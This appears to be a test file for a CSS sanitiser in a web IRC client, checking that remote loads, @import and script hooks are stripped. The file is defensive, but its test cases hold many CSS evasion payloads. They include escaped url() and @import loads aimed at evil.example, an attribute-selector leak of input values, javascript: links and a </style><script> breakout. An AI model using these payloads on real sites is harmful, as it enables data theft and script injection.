import { afterEach, beforeEach, describe, expect, it, vi } from "vitest";
import {
  getCustomCssState,
  isValidCssLink,
  loadCustomCss,
  resetCustomCssForTests,
  sanitizeCss,
  saveOwnCss,
  setCssLink,
} from "../../src/lib/customCss";
import { networkHost } from "../../src/lib/networkHost";
import type { Server } from "../../src/types";

const DATA = 'url("data:image/svg+xml,%3Csvg%3E%3C/svg%3E")';
const EVIL = /evil\.example/;

describe("sanitizeCss", () => {
  it("keeps ordinary rules and inline data: images", () => {
    const css = `.a { color: red; background: ${DATA} left / contain; }`;
    expect(sanitizeCss(css)).toBe(css);
  });

  it("removes @import and remote url()s", () => {
    const out = sanitizeCss(
      '@import "https://evil.example/x.css";\n' +
        ".a { background: url(https://evil.example/p.png) }\n" +
        "@font-face { src: url('//evil.example/f.woff') }",
    );
    expect(out).not.toMatch(EVIL);
    expect(out).not.toMatch(/@import/i);
  });

  it("sees through CSS escapes that spell url( or @import", () => {
    for (const sneaky of [
      ".a { background: \\75 rl(https://evil.example/p.png) }",
      ".a { background: u\\rl(https://evil.example/p.png) }",
      ".a { background: \\000075rl(https://evil.example/p.png) }",
      "@\\69 mport 'https://evil.example/x.css';",
    ]) {
      expect(sanitizeCss(sneaky)).not.toMatch(EVIL);
    }
  });

  it("neutralises a url( left open at the end of the stylesheet", () => {
    for (const sneaky of [
      ".a { background: url(https://evil.example/p.png",
      ".a { background: url('https://evil.example/p.png",
      '.a { background: url("https://evil.example/p.png',
      ".a { background: \\75 rl(https://evil.example/p.png",
    ]) {
      expect(sanitizeCss(sneaky)).not.toMatch(EVIL);
    }
    // a data: URL that is closed stays, even when followed by an open one
    const out = sanitizeCss(
      `.a { background: ${DATA} } .b { background: url(https://evil.example/p.png`,
    );
    expect(out).toContain(DATA);
    expect(out).not.toMatch(EVIL);
  });

  it("normalises line endings like the browser before decoding escapes", () => {
    // "\75" + CRLF + "rl(" is url( to the browser: CRLF is one newline,
    // and the single whitespace after an escape is consumed.
    for (const ws of ["\r\n", "\r", "\f"]) {
      const out = sanitizeCss(
        `.a { background: \\75${ws}rl(https://evil.example/p.png) }`,
      );
      expect(out).not.toMatch(EVIL);
    }
  });

  it("disables functions that take a bare string URL, escaped or not", () => {
    const out = sanitizeCss(
      '.a { background: image("https://evil.example/a.png"); }\n' +
        '.b { background-image: src("https://evil.example/b.png"); }\n' +
        '.c { background: -webkit-image-set("https://evil.example/c.png" 1x); }\n' +
        '.d { background: \\69 mage("https://evil.example/d.png"); }\n' +
        '.e { background: \\73\r\nrc("https://evil.example/e.png"); }',
    );
    expect(out).not.toMatch(/(^|[^\w-])(-webkit-)?(image-set|image|src)\(/i);
  });

  it("leaves the @font-face src descriptor and data: fonts alone", () => {
    const css =
      '@font-face { font-family: x; src: url("data:font/woff2;base64,AA==") format("woff2"); }';
    expect(sanitizeCss(css)).toBe(css);
  });

  it.each([
    [
      "a url( spelled inside one string and closed inside a later one",
      `x{content:'url("data:'} input[value^="a"]{background:url(https://evil.example/a)} z{content:'")'}`,
    ],
    [
      "a quoted url() cut short by a newline",
      'a{background:url("data:a\n) } .x{background:url(https://evil.example/b)} .y{content:")"}',
    ],
    [
      "a url( spelled inside a comment",
      '/* url("data: */ .a{background:url(https://evil.example/c)} /* ") */',
    ],
    [
      "an escaped quote inside a string",
      '.a{content:"\\"";background:url(https://evil.example/d)}',
    ],
    [
      "a string continued over a line break",
      '.a{content:"x\\\n";background:url(https://evil.example/e)}',
    ],
    [
      "the other quote character inside a string",
      `.a{content:"'";background:url('https://evil.example/f')}`,
    ],
    [
      "a comment opener inside a string",
      '.a{content:"/*";background:url(https://evil.example/g)} .b{content:"*/"}',
    ],
    [
      "a data: url() followed by a remote one",
      ".a{background:url( 'data:image/png;base64,AA==' ), url(  'https://evil.example/h'  )}",
    ],
    ["upper case", ".a{background:URL(https://evil.example/i)}"],
    [
      "an escaped upper-case letter",
      ".a{background:\\55RL(https://evil.example/j)}",
    ],
    [
      "escapes inside the address",
      ".a{background:url(\\68ttps://evil.example/k)}",
    ],
    [
      "a data: prefix that is only an argument of a quoted url()",
      '.a{background:url("https://evil.example/l" "data:x")}',
    ],
    [
      "an escaped closing parenthesis",
      ".a{background:url(data:x\\);background:url(https://evil.example/m)}",
    ],
    ["@import without a space", '@import"https://evil.example/n.css";'],
    [
      "@import in upper case",
      "@IMPORT url(https://evil.example/o.css) screen;",
    ],
    [
      "@import with an escaped letter",
      "@im\\port 'https://evil.example/p.css';",
    ],
    [
      "@import with a semicolon inside its string",
      "@import 'https://evil.example/q.css?a;b' screen; .a{color:red}",
    ],
    ["@import that never ends", "@import 'https://evil.example/r.css'"],
    [
      "image-set with an escaped letter",
      '.a{background:image-\\73 et("https://evil.example/s" 1x)}',
    ],
    [
      "a prefixed image-set after a comment",
      '.a{background:/**/-webkit-image-set("https://evil.example/t" 1x)}',
    ],
    [
      "a malformed url( after <!-- that opens a string",
      '.z{x:<!--url(a" b)} .a{background:url(https://evil.example/u)} .b{content:"}',
    ],
    [
      "the same with a single quote",
      ".z{x:<!--url(a' b)} .a{background:url(https://evil.example/v)} .b{content:'}",
    ],
    [
      "a malformed url( after <!-- that opens a comment",
      ".z{x:<!--url(/*)} .a{background:url(https://evil.example/w)} /**/",
    ],
    [
      "an escaped url( after <!--",
      '.z{x:<!--\\75rl(a"b)} .a{background:url(https://evil.example/x)} .b{content:"}',
    ],
    [
      "a malformed url( after <!-- outside any rule",
      '<!--url(a" b){} .a{background:url(https://evil.example/y)} .b{content:"}',
    ],
    [
      "an image-set behind a malformed url( after <!--",
      '.z{x:<!--url(a"b)} .a{background:image-set("https://evil.example/z" 1x)} .b{content:"}',
    ],
    [
      "a malformed url( after -->",
      '.z{x:-->url(a" b)} .a{background:url(https://evil.example/aa)} .b{content:"}',
    ],
    [
      "a comment opener in the brackets after a number with the unit url",
      '.z{x:1url(data:/*) " */ )} .a{background:url(https://evil.example/ab)} .b{content:" "}',
    ],
    [
      "the same after a decimal fraction",
      '.z{x:.5url(data:/*) " */ )} .a{background:url(https://evil.example/ac)} .b{content:" "}',
    ],
    [
      "the same after a number with an exponent",
      '.z{x:1e3url(data:/*) " */ )} .a{background:url(https://evil.example/ad)} .b{content:" "}',
    ],
    [
      "the same after a hash named url",
      '.z{x:#url(data:/*) " */ )} .a{background:url(https://evil.example/ae)} .b{content:" "}',
    ],
    [
      "a no-break space before url(",
      ".a{background:\u00a0url(https://evil.example/af)}",
    ],
    [
      "a malformed url( after a no-break space",
      '.z{x:\u00a0url(a" b)} .a{background:url(https://evil.example/ag)} .b{content:"}',
    ],
    [
      "a quoted data: url( whose name starts with a line separator",
      '.z{x:\u2028url("data:x" url(https://evil.example/ah))}',
    ],
    [
      "a no-break space before image-set",
      '.a{background:\u00a0image-set("https://evil.example/ai" 1x)}',
    ],
    [
      "a no-break space after @import",
      '@import\u00a0"https://evil.example/aj.css";',
    ],
    [
      "a malformed url( after a unicode range",
      '.z{x:u+aaaaaaurl(a" b)} .a{background:url(https://evil.example/ak)} .b{content:"}',
    ],
  ])("blocks a remote address hidden by %s", (_name, css) => {
    const out = sanitizeCss(css);
    expect(out).not.toMatch(
      /url\(\s*['"]?\s*(?!data:)[^)'"\s]|@import|(^|[^\w-])(-\w+-)?(image-set|image|src)\(/i,
    );
    expect(sanitizeCss(out)).toBe(out);
  });

  it("reads the url( after <!-- as an address", () => {
    expect(
      sanitizeCss(
        '.z{x:<!--url(a" b)} .a{background:url(https://evil.example/a)} .b{content:"}',
      ),
    ).toBe('.z{x:<!--none} .a{background:none} .b{content:"}"');
  });

  it("refuses every function whose name ends in url", () => {
    expect(sanitizeCss('.a{x:--url("data:x" y) z}')).toBe(".a{x:none z}");
    expect(sanitizeCss(".a{x:my-url(data:x)}")).toBe(".a{x:none}");
  });

  it("gives the same text when its own output is sanitised again", () => {
    const out = sanitizeCss(".a{x:url(https://evil.example/a)1url(.b)}");
    expect(out).toBe(".a{x:none 1url(.b)}");
    expect(sanitizeCss(out)).toBe(out);
  });

  it("keeps numbers, colours and HTML comment marks as written", () => {
    const css =
      "<!-- .a{margin:.5em 1e3px -1.5rem;color:#fff;width:calc(100% - 1px)} --> #url{--bg-url:1url;line-height:1.}";
    expect(sanitizeCss(css)).toBe(css);
  });

  it("joins no pieces into a new url( when it removes an @import", () => {
    expect(
      sanitizeCss(".a{background:ur@import x;l(https://evil.example/p.png)}"),
    ).toBe(".a{background:ur l(https://evil.example/p.png)}");
  });

  it("keeps text inside strings and comments as written", () => {
    const css =
      '/* see url(https://docs.example/a) */ .a::after { content: "url(https://docs.example/b) @import image(\\"x\\")"; }';
    expect(sanitizeCss(css)).toBe(css);
  });

  it("keeps a data: image whose text contains quotes and parentheses", () => {
    const css = `.a { background: url("data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg'><path transform='scale(2)'/></svg>") }`;
    expect(sanitizeCss(css)).toBe(css);
  });

  it("closes a string or comment left open at the end", () => {
    // so CSS joined on after the result starts outside any string or comment
    expect(sanitizeCss('.a{content:"x')).toBe('.a{content:"x"');
    expect(sanitizeCss('.a{content:"x\\')).toBe('.a{content:"x"');
    expect(sanitizeCss(".a{} /* note")).toBe(".a{} /* note*/");
  });

  it("copes with deeply nested brackets", () => {
    const deep = `@import ${"(".repeat(200_000)};`;
    expect(sanitizeCss(deep).trim()).toBe("");
  });

  it("neutralises legacy script hooks and can't close <style>", () => {
    const out = sanitizeCss(
      ".a { width: expression(alert(1)) }</style><script>x</script>",
    );
    expect(out).not.toMatch(/expression\s*\(/);
    expect(out).not.toMatch(/<\/style/i);
  });
});

describe("isValidCssLink", () => {
  it("accepts only http(s) URLs", () => {
    expect(isValidCssLink("https://files.example/raw/logos.css")).toBe(true);
    expect(isValidCssLink("http://files.example/logos.css")).toBe(true);
    expect(isValidCssLink("javascript:alert(1)")).toBe(false);
    expect(isValidCssLink("data:text/css,a{}")).toBe(false);
    expect(isValidCssLink("not a url")).toBe(false);
  });
});

describe("networkHost (data-network-host)", () => {
  const server = {
    name: "n",
    host: "ircs://IRC.Uplink.Example:6697",
    port: 6697,
  };
  it("is the upstream host, from soju for bound networks", () => {
    expect(networkHost(server as Server)).toBe("irc.uplink.example");
    expect(
      networkHost(
        { ...server, host: "soju.example", bouncerNetid: "1" } as Server,
        { netid: "1", attributes: { host: "irc.alder.example" } },
      ),
    ).toBe("irc.alder.example");
    expect(networkHost({ ...server, isBouncerControl: true } as Server)).toBe(
      "",
    );
  });
});

describe("own and linked stylesheets", () => {
  const LINK = "https://files.example/raw/theme.css";
  let backing: Map<string, string>;
  let remote: { status: number; body: string };
  let fetchMock: ReturnType<typeof vi.fn>;

  function styleText() {
    return document.getElementById("obby-custom-css")?.textContent ?? null;
  }
  function linkStyleText() {
    return document.getElementById("obby-custom-css-link")?.textContent ?? null;
  }

  beforeEach(() => {
    resetCustomCssForTests();
    backing = new Map();
    remote = { status: 200, body: ".linked { color: blue; }" };
    vi.mocked(localStorage.getItem).mockImplementation(
      (k) => backing.get(k) ?? null,
    );
    vi.mocked(localStorage.setItem).mockImplementation((k, v) => {
      backing.set(k, v);
    });
    vi.mocked(localStorage.removeItem).mockImplementation((k) => {
      backing.delete(k);
    });
    fetchMock = vi.fn(async (url: string, init?: RequestInit) => {
      expect(url).toBe(LINK);
      // no cookies or referrer go to the third-party host
      expect(init).toMatchObject({
        credentials: "omit",
        referrerPolicy: "no-referrer",
      });
      return new Response(remote.body, { status: remote.status });
    });
    vi.stubGlobal("fetch", fetchMock);
  });
  afterEach(() => {
    resetCustomCssForTests();
    vi.unstubAllGlobals();
    vi.restoreAllMocks();
  });

  it("own CSS is applied and kept across reloads, without any request", () => {
    saveOwnCss("body { color: red; }");
    expect(styleText()).toBe("body { color: red; }");
    resetCustomCssForTests();
    loadCustomCss();
    expect(styleText()).toBe("body { color: red; }");
    expect(fetchMock).not.toHaveBeenCalled();
  });

  it("a link is fetched, applied before own CSS, and refreshed on startup", async () => {
    saveOwnCss(".own{}");
    await setCssLink(LINK);
    expect(getCustomCssState().linkStatus).toBe("ok");
    expect(linkStyleText()).toBe(".linked { color: blue; }");
    expect(styleText()).toBe(".own{}");
    const styles = [...document.head.querySelectorAll("style")].map(
      (el) => el.id,
    );
    expect(styles.slice(-2)).toEqual([
      "obby-custom-css-link",
      "obby-custom-css",
    ]);

    remote.body = ".linked { color: green; }";
    resetCustomCssForTests();
    loadCustomCss();
    // last good copy applies immediately, then the update arrives
    expect(linkStyleText()).toContain("blue");
    await vi.waitFor(() => expect(linkStyleText()).toContain("green"));
    expect(styleText()).toBe(".own{}");
  });

  it("keeps a block the linked file leaves open away from own CSS", async () => {
    remote.body = '.q{content:"open';
    await setCssLink(LINK);
    saveOwnCss("#root{outline-style:dashed}");
    expect(linkStyleText()).toBe('.q{content:"open"');
    expect(styleText()).toBe("#root{outline-style:dashed}");
  });

  it("keeps the cached copy when the host is down", async () => {
    await setCssLink(LINK);
    remote.status = 503;
    resetCustomCssForTests();
    loadCustomCss();
    await vi.waitFor(() =>
      expect(getCustomCssState().linkStatus).toBe("cached"),
    );
    expect(linkStyleText()).toContain(".linked");
  });

  it("reports an error for a preview page instead of a raw file", async () => {
    remote.body = "<!doctype html><html>preview</html>";
    await setCssLink(LINK);
    expect(getCustomCssState().linkStatus).toBe("error");
    expect(styleText()).toBeNull();
  });

  it("linked CSS is sanitised too", async () => {
    remote.body = ".a { background: url(https://evil.example/x) }";
    await setCssLink(LINK);
    expect(linkStyleText()).toBe(".a { background: none }");
  });

  it("refuses non-http links and can be removed", async () => {
    await expect(setCssLink("javascript:alert(1)")).rejects.toThrow();
    await setCssLink(LINK);
    await setCssLink("");
    expect(getCustomCssState()).toMatchObject({ link: "", linkCss: "" });
    expect(linkStyleText()).toBeNull();
  });
});
